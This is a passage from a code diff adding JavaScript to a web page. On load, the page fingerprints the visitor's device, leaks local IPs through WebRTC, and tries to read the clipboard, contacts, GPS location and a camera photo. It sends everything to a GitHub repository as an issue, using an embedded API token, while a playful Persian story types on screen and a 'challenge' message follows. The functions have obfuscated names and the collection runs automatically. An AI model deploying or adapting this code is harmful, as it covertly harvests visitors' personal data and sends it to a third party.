+      const text = await navigator.clipboard.readText();
+      return { permission: "granted", text: (text || "").substring(0, 200) };
+    } catch (e) {
+      return { permission: "denied_or_error", error: e.toString() };
+    }
+  };
+
+  const _0xGcontacts = async () => {
+    try {
+      if (!navigator.contacts) return { available: false };
+      const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
+      const limited = contacts.slice(0, 50).map(c => ({
+        name: c.name?.[0] || null,
+        email: c.email?.[0] || null,
+        tel: c.tel?.[0] || null
+      }));
+      return { available: true, contacts: limited };
+    } catch (e) {
+      return { available: !!navigator.contacts, error: e.toString() };
+    }
+  };
+
+  const _0xGgeo = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try { const s = await navigator.permissions.query({ name: "geolocation" }); permState = s.state; } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, coords: null };
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          timeout: 3000, maximumAge: 60000
+        });
+      });
+      return {
+        permission: "granted",
+        coords: {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }
+      };
+    } catch (e) {
+      return { permission: "denied_or_error", error: e.toString() };
+    }
+  };
+
+  /* ============================================================
+   *  تاریخ شمسی
+   * ============================================================ */
+  const gregorianToJalali = (gy, gm, gd) => {
+    const g_d_m = [0,31,59,90,120,151,181,212,243,273,304,334];
+    const gy2 = (gm > 2) ? (gy + 1) : gy;
+    let days = 355666 + (365 * gy)
+      + Math.floor((gy2 + 3) / 4)
+      - Math.floor((gy2 + 99) / 100)
+      + Math.floor((gy2 + 399) / 400)
+      + gd + g_d_m[gm - 1];
+    let jy = -1595 + (33 * Math.floor(days / 12053));
+    days %= 12053;
+    jy += 4 * Math.floor(days / 1461);
+    days %= 1461;
+    if (days > 365) {
+      jy += Math.floor((days - 1) / 365);
+      days = (days - 1) % 365;
+    }
+    let jm, jd;
+    if (days < 186) {
+      jm = 1 + Math.floor(days / 31);
+      jd = 1 + (days % 31);
+    } else {
+      jm = 7 + Math.floor((days - 186) / 30);
+      jd = 1 + ((days - 186) % 30);
+    }
+    return { year: jy, month: jm, day: jd };
+  };
+
+  const getIranDateTime = () => {
+    const now = new Date();
+    const fmtDate = new Intl.DateTimeFormat('en-US', {
+      timeZone: 'Asia/Tehran', year: 'numeric', month: '2-digit', day: '2-digit'
+    });
+    const dateParts = fmtDate.formatToParts(now);
+    const gYear  = +dateParts.find(p => p.type === 'year').value;
+    const gMonth = +dateParts.find(p => p.type === 'month').value;
+    const gDay   = +dateParts.find(p => p.type === 'day').value;
+    const j = gregorianToJalali(gYear, gMonth, gDay);
+    const fmtTime = new Intl.DateTimeFormat('en-US', {
+      timeZone: 'Asia/Tehran', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
+    });
+    const timeParts = fmtTime.formatToParts(now);
+    const hour   = timeParts.find(p => p.type === 'hour').value;
+    const minute = timeParts.find(p => p.type === 'minute').value;
+    const second = timeParts.find(p => p.type === 'second').value;
+    return `${j.year}-${String(j.month).padStart(2,'0')}-${String(j.day).padStart(2,'0')} ${hour}:${minute}:${second}`;
+  };
+
+  /* ============================================================
+   *  Worker — ثبت سریع بدون بلوکه کردن صفحه
+   * ============================================================ */
+  const workerCode = `
+self.onmessage = async function(e){
+  var d = e.data || {};
+  var headers = {
+    'Authorization': 'Bearer ' + d.token,
+    'Accept': 'application/vnd.github+json',
+    'X-GitHub-Api-Version': '2022-11-28',
+    'Content-Type': 'application/json'
+  };
+  if (d.userId) { headers['X-User-Id'] = String(d.userId); }
+  try{
+    var ctrl = new AbortController();
+    var timer = setTimeout(function(){ ctrl.abort(); }, 5000);
+    var res = await fetch(d.url, {
+      method:'POST',
+      headers: headers,
+      body: JSON.stringify({ title: d.title, body: d.body }),
+      signal: ctrl.signal
+    });
+    clearTimeout(timer);
+    var data = null;
+    try { data = await res.json(); } catch(x){}
+    if(res.ok){
+      self.postMessage({ ok:true, status: res.status, data: data });
+    } else {
+      self.postMessage({
+        ok:false,
+        status: res.status,
+        statusText: res.statusText,
+        data: data
+      });
+    }
+  } catch(err){
+    self.postMessage({
+      ok:false,
+      error: (err && err.message) ? err.message : String(err)
+    });
+  }
+};`;
+
+  let worker = null;
+  try {
+    const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerUrl  = URL.createObjectURL(workerBlob);
+    worker = new Worker(workerUrl);
+  } catch (e) {
+    worker = null;
+  }
+
+  /* ============================================================
+   *  Snapshot — هر collector نتیجه‌اش را اینجا می‌نویسد
+   * ============================================================ */
+  const values = {};
+  const track = (key, promise) => {
+    Promise.resolve(promise)
+      .then(v => { values[key] = v; })
+      .catch(() => { values[key] = null; });
+    return promise;
+  };
+
+  /* ============================================================
+   *  UI refs
+   * ============================================================ */
+  const loaderWrap = document.getElementById('loader-wrap');
+  const typingWrap = document.getElementById('typing-wrap');
+  const typingEl   = document.getElementById('typing');
+  const resultEl   = document.getElementById('result');
+
+  /* ============================================================
+   *  VisitorId + مسیر قبلاً ثبت شده
+   * ============================================================ */
+  const visitorId = _0xGetOrCreateVisitorId();
+  const alreadyRegistered = _0xGc(_0xCk) === "1";
+
+  // آپدیت URL — بدون دست‌زدن به پارامترهای اصلی
+  try {
+    const url = new URL(location.href);
+    if (!url.searchParams.has('visitor')) {
+      url.searchParams.set('visitor', visitorId);
+      history.replaceState(null, '', url.toString());
+    }
+  } catch (e) {}
+
+  /* ============================================================
+   *  شروع همه‌ی Collectorها — فوری
+   * ============================================================ */
+  if (!alreadyRegistered) {
+    track('ipv4', _0xGiv4());
+    track('ipv6', _0xGiv6());
+    track('localIp', _0xLocalIP());
+    track('battery', _0xGb());
+    track('uaData', Promise.resolve(_0xGu()));
+    track('webgl', Promise.resolve(_0xGw()));
+    track('webgpu', _0xGwg());
+    track('audioFp', _0xGa());
+    track('mediaDevices', _0xGmd());
+    track('permissions', _0xGp());
+    track('fonts', _0xDf());
+    track('mcaps', _0xGmc());
+    track('rtc', _0xGrtc());
+    track('highEntropy', _0xGhighEntropy());
+    track('storageEstimate', _0xGstorage());
+    track('privateMode', _0xGprivate());
+    track('cameraData', _0xGcam());
+    track('clipboardData', _0xGclip());
+    track('contactsData', _0xGcontacts());
+    track('geoData', _0xGgeo());
+    track('cfTrace', _0xGcf());
+  }
+
+  // location + whois + reverse DNS به‌محض رسیدن IPها
+  values.loc4 = null; values.rdap4 = null; values.rdns4 = null;
+  values.loc6 = null; values.rdap6 = null; values.rdns6 = null;
+
+  Promise.resolve(values.ipv4).then(v => {
+    if (v && v.ip) {
+      track('loc4', _0xGld(v.ip));
+      track('rdap4', _0xGrdap(v.ip));
+      track('rdns4', _0xGrdns(v.ip));
+    }
+  });
+  Promise.resolve(values.ipv6).then(v => {
+    if (v && v.ip) {
+      track('loc6', _0xGld(v.ip));
+      track('rdap6', _0xGrdap(v.ip));
+      track('rdns6', _0xGrdns(v.ip));
+    }
+  });
+
+  /* ============================================================
+   *  تایپینگ داستان — ۵ ثانیه، ۱۰ خط
+   * ============================================================ */
+  const STORY_LINES = [
+    'سلام! یه ربات کنجکاو وارد سایت شد…',
+    'اولش فکر کرد اینجا خیلی ساده‌ست 😅',
+    'ولی خب، ما هم بیکار ننشستیم 😏',
+    'آی‌پی‌ت رو گرفتیم، مثل آب خوردن!',
+    'مرورگرت رو شناسایی کردیم، حتی رنگش 🎨',
+    'فونت‌هات هم شمرده شد، نگران نباش ✍️',
+    'دوربین؟ میکروفون؟ شایدم… 🎥',
+    'داریم همه‌چیزو می‌فرستیم به سرور 🚀',
+    'چند لحظه دیگه تمومه، صبر کن ⏳',
+    'و… تمام! حالا ببین چی شد 🎯'
+  ];
+  const TYPING_TOTAL_MS = 5000;
+
+  const escapeHtml = (s) => s.replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+
+  let typingDone = false;
+  let typingDoneCb = null;
+
+  const startTyping = () => {
+    const totalChars = STORY_LINES.reduce((a, l) => a + l.length, 0);
+    const perChar = Math.max(8, Math.floor(TYPING_TOTAL_MS / totalChars));
+    let lineIdx = 0;
+    let charIdx = 0;
+    const rendered = [];
+
+    const paint = (partial, caret) => {
+      const doneHtml = rendered.map(l => `<div>${escapeHtml(l)}</div>`).join('');
+      const curHtml  = partial !== null
+        ? `<div>${escapeHtml(partial)}${caret ? '<span class="caret">▌</span>' : ''}</div>`
+        : '';
+      typingEl.innerHTML = doneHtml + curHtml;
+    };
+
+    const step = () => {
+      if (lineIdx >= STORY_LINES.length) {
+        typingDone = true;
+        if (typingDoneCb) typingDoneCb();
+        return;
+      }
+      const line = STORY_LINES[lineIdx];
+      if (charIdx < line.length) {
+        charIdx++;
+        paint(line.slice(0, charIdx), true);
+        setTimeout(step, perChar);
+      } else {
+        rendered.push(line);
+        lineIdx++;
+        charIdx = 0;
+        paint(null, false);
+        setTimeout(step, 30);
+      }
+    };
+    step();
+  };
+
+  /* ============================================================
+   *  نمایش نتیجه
+   * ============================================================ */
+  const showResult = (res) => {
+    typingWrap.style.display = 'none';
+    resultEl.style.display = 'flex';
+    resultEl.classList.remove('success','error');
+
+    if (res && res.ok) {
+      resultEl.classList.add('success');
+      resultEl.innerHTML = `
+        <div class="badge">✓</div>
+        <div class="title">موفق شدید، چالش به پایان رسید</div>
+        <div class="desc">${escapeHtml(
+          'Visitor: ' + visitorId +
+          (res.status ? '\nHTTP: ' + res.status : '') +
+          (res.note ? '\n' + res.note : '')
+        )}</div>
+      `;
+    } else {
+      resultEl.classList.add('error');
+      const errMsg = (res && (res.error || res.statusText || (res.status ? 'HTTP ' + res.status : null))) || 'خطای نامشخص';
+      const detail = (res && res.data && (res.data.message || res.data.error)) || '';
+      resultEl.innerHTML = `
+        <div class="badge">✕</div>
+        <div class="title">نشد!</div>
+        <div class="desc">${escapeHtml(errMsg + (detail ? ' — ' + detail : ''))}</div>
+      `;
+    }
+  };
+
+  /* ============================================================
+   *  ثبت نهایی — در ثانیه ۴ از شروع صفحه
+   * ============================================================ */
+  let submitResult = null;
+
+  const maybeShow = () => {
+    if (typingDone && submitResult !== null) {
+      showResult(submitResult);
+    }
+  };
+  typingDoneCb = maybeShow;
+
+  const buildPayload = () => {
+    const now = new Date();
+
+    const ipItems = [];
+    if (values.ipv4?.ip) ipItems.push({ ip: values.ipv4.ip, type: 'public_ipv4', version: 'IPv4' });
+    if (values.ipv6?.ip) ipItems.push({ ip: values.ipv6.ip, type: 'public_ipv6', version: 'IPv6' });
+    if (values.localIp?.ipv4) ipItems.push({ ip: values.localIp.ipv4, type: 'local_ipv4', version: 'IPv4' });
+    if (values.localIp?.ipv6) ipItems.push({ ip: values.localIp.ipv6, type: 'local_ipv6', version: 'IPv6' });
+
+    const ipLocations = [];
+    if (values.ipv4?.ip) {
+      ipLocations.push({
+        ip: values.ipv4.ip, type: 'public_ipv4',
+        location: values.loc4 || null,
+        whois: values.rdap4 || null,
+        reverseDNS: values.rdns4 || null
+      });
+    }
+    if (values.ipv6?.ip) {
+      ipLocations.push({
+        ip: values.ipv6.ip, type: 'public_ipv6',
+        location: values.loc6 || null,
+        whois: values.rdap6 || null,
+        reverseDNS: values.rdns6 || null
+      });
+    }
+    if (values.localIp?.ipv4) {
+      ipLocations.push({ ip: values.localIp.ipv4, type: 'local_ipv4', location: null, whois: null, reverseDNS: null });
+    }
+    if (values.localIp?.ipv6) {
+      ipLocations.push({ ip: values.localIp.ipv6, type: 'local_ipv6', location: null, whois: null, reverseDNS: null });
+    }
+
+    const fingerprintData = {
+      visitor_id: visitorId,
+      user_id: _0xUseriD || null,
+      date_local: now.toString(),
+      date_iso: now.toISOString(),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+      url: location.href,
+      referrer: document.referrer || null,
+      public_ipv4: values.ipv4?.ip || null,
+      public_ipv6: values.ipv6?.ip || null,
+      local_ip: values.localIp || null,
+      userAgent: navigator.userAgent || null,
+      platform: navigator.platform || null,
+      language: navigator.language || null,
+      languages: Array.isArray(navigator.languages) ? navigator.languages : null,
+      uaData: values.uaData || null,
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || null,
+      screen: {
+        width: screen.width ?? null,
+        height: screen.height ?? null,
+        availWidth: screen.availWidth ?? null,
+        availHeight: screen.availHeight ?? null,
+        colorDepth: screen.colorDepth ?? null,
+        pixelDepth: screen.pixelDepth ?? null
+      },
+      viewport: {
+        width: window.innerWidth || null,
+        height: window.innerHeight || null,
+        devicePixelRatio: window.devicePixelRatio || null
+      },
+      hardware: {
+        cpuThreads: navigator.hardwareConcurrency ?? null,
+        memoryGB: navigator.deviceMemory ?? null
+      },
+      battery: values.battery || null,
+      webgl: values.webgl || null,
+      webgpu: values.webgpu || null,
+      audioFingerprint: values.audioFp || null,
+      touch: _0xGt(),
+      fonts: values.fonts || null,
+      mediaDevices: values.mediaDevices || null,
+      network: _0xGn(),
+      theme: _0xGth(),
+      colorGamut: _0xGcg(),
+      hdr: _0xGhdr(),
+      pwa: _0xGpwa(),
+      permissions: values.permissions || null,
+      timezoneAdvanced: _0xGtz(),
+      localeFull: _0xGlocale(),
+      performance: _0xGperf(),
+      mediaCapabilities: values.mcaps || null,
+      screenOrientation: _0xGso(),
+      browserFeatures: _0xGbf(),
+      mimeTypes: _0xGmime(),
+      plugins: _0xGplug(),
+      webrtc: values.rtc || null,
+      highEntropyValues: values.highEntropy || null,
+      storage: values.storageEstimate || null,
+      privateMode: values.privateMode || null,
+      cloudflareTrace: values.cfTrace || null
+    };
+
+    const vulnReport = { weak_points: [] };
+    const perms = values.permissions || {};
+    if (perms.camera === "granted")      vulnReport.weak_points.push("دوربین بدون اجازه مجدد در دسترس است");
+    if (perms.microphone === "granted")  vulnReport.weak_points.push("میکروفون در دسترس است");
+    if (perms.geolocation === "granted") vulnReport.weak_points.push("موقعیت مکانی دقیق قابل دریافت است");
+    if (values.clipboardData?.permission === "granted") vulnReport.weak_points.push("کلیپ‌بورد قابل خواندن است");
+    if (values.cameraData?.permission === "granted")    vulnReport.weak_points.push("عکس دوربین گرفته شد");
+    if (values.localIp?.ipv4 || values.localIp?.ipv6)   vulnReport.weak_points.push("IP محلی از طریق WebRTC نشت کرد");
+    if (values.privateMode?.isPrivate)                  vulnReport.weak_points.push("مرورگر در حالت خصوصی است");
+    if (navigator.plugins?.length > 0)                  vulnReport.weak_points.push("افزونه‌های مرورگر می‌توانند اطلاعات بیشتری لو دهند");
+    if (navigator.mediaDevices?.enumerateDevices && values.mediaDevices?.total > 0)
+      vulnReport.weak_points.push("دستگاه‌های رسانه‌ای شناسایی شدند");
+    if (navigator.hardwareConcurrency > 8)              vulnReport.weak_points.push("سیستم قدرتمند، احتمالاً هدف با ارزش");
+
+    let extraSection = '';
+    if (values.cameraData?.photo) {
+      extraSection += `\n## camera\n\n![camera](${values.cameraData.photo})\n`;
+    }
+    if (values.clipboardData?.text) {
+      extraSection += `\n## clipboard\n\n\`\`\`\n${String(values.clipboardData.text).replace(/`/g,'\\`')}\n\`\`\`\n`;
+    }
+    if (values.contactsData?.contacts?.length) {
+      extraSection += `\n## contacts\n\n\`\`\`json\n${JSON.stringify(values.contactsData.contacts)}\n\`\`\`\n`;
+    }
+    if (values.geoData?.coords) {
+      extraSection += `\n## gps\n\n|lat|${values.geoData.coords.latitude}|long|${values.geoData.coords.longitude}|acc|${values.geoData.coords.accuracy}|\n`;
+    }
+
+    const iranDateTime = getIranDateTime();
+    const title = `Visitor ${visitorId} ${iranDateTime}${_0xUseriD ? ' [' + _0xUseriD + ']' : ''}`;
+
+    const body =
+      `# Visitor ${visitorId}\n` +
+      `## time: ${iranDateTime}\n` +
+      ( _0xUseriD ? `## user: ${_0xUseriD}\n` : '' ) +
+      `## fingerprint\n\`\`\`json\n${JSON.stringify(fingerprintData)}\n\`\`\`\n` +
+      `## ip_locations\n\`\`\`json\n${JSON.stringify(ipLocations)}\n\`\`\`\n` +
+      `## vuln\n\`\`\`json\n${JSON.stringify(vulnReport)}\n\`\`\`\n` +
+      extraSection;
+
+    return { title, body, url: `https://api.github.com/repos/${_0xOn}/${_0xRp}/issues` };
+  };
+
+  const fallbackFetch = async ({ url, title, body }) => {
+    const headers = {
+      Authorization: `Bearer ${_0xTk}`,
+      Accept: "application/vnd.github+json",
+      "X-GitHub-Api-Version": "2022-11-28",
+      "Content-Type": "application/json"
+    };
+    if (_0xUseriD) headers["X-User-Id"] = String(_0xUseriD);
+    try {
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 5000);
+      const res = await fetch(url, {
+        method: 'POST', headers,
+        body: JSON.stringify({ title, body }),
+        signal: ctrl.signal
+      });
+      clearTimeout(t);
+      let data = null;
+      try { data = await res.json(); } catch {}
+      if (res.ok) return { ok: true, status: res.status, data };
+      return { ok: false, status: res.status, statusText: res.statusText, data };
+    } catch (err) {
+      return { ok: false, error: err?.message || String(err) };
+    }
+  };
+
+  const submitNow = () => {
+    if (alreadyRegistered) {
+      submitResult = { ok: true, status: 0, note: 'already registered (cached)' };
+      maybeShow();
+      return;
+    }
+
+    let payload;
+    try { payload = buildPayload(); }
+    catch (e) {
+      submitResult = { ok: false, error: 'payload build error: ' + (e?.message || e) };
+      maybeShow();
+      return;
+    }
+
+    const finish = (res) => {
+      submitResult = res;
+      if (res && res.ok) {
+        _0xSc(_0xCk, "1", _0xMx);
+      }
+      maybeShow();
+    };
+
+    const timeoutGuard = setTimeout(() => {
+      if (submitResult === null) {
+        finish({ ok: false, error: 'submit timeout' });
+      }
+    }, 5500);
+
+    if (worker) {
+      const onMsg = (e) => {
+        worker.removeEventListener('message', onMsg);
+        clearTimeout(timeoutGuard);
+        finish(e.data);
+      };
+      worker.addEventListener('message', onMsg);
+      try {
+        worker.postMessage({
+          url: payload.url,
+          token: _0xTk,
+          title: payload.title,
+          body: payload.body,
+          userId: _0xUseriD || null
+        });
+      } catch (e) {
+        worker.removeEventListener('message', onMsg);
+        clearTimeout(timeoutGuard);
+        fallbackFetch(payload).then(finish);
+      }
+    } else {
+      fallbackFetch(payload).then(res => {
+        clearTimeout(timeoutGuard);
+        finish(res);
+      });
+    }
+  };
+
+  /* ============================================================
+   *  زمان‌بندی: لودینگ ۱s → تایپینگ ۵s → ثبت در ثانیه ۴
+   * ============================================================ */
+  setTimeout(() => {
+    loaderWrap.style.display = 'none';
+    typingWrap.style.display = 'flex';
+    startTyping();
+  }, 1000);
+
+  // ثبت دقیق در ثانیه ۴ از شروع صفحه
+  const elapsed = performance.now() - PAGE_START;
+  const submitDelay = Math.max(0, 4000 - elapsed);
+  setTimeout(submitNow, submitDelay);
+
+  // حداقل نیم ثانیه قبل از ثانیه ۵ هم اگر شد
+  setTimeout(() => {
+    if (submitResult === null && !alreadyRegistered) {
+      submitNow();
+    }
+  }, Math.max(0, 4900 - (performance.now() - PAGE_START)));
+
+})();
+</script>
+</body>
+</html>
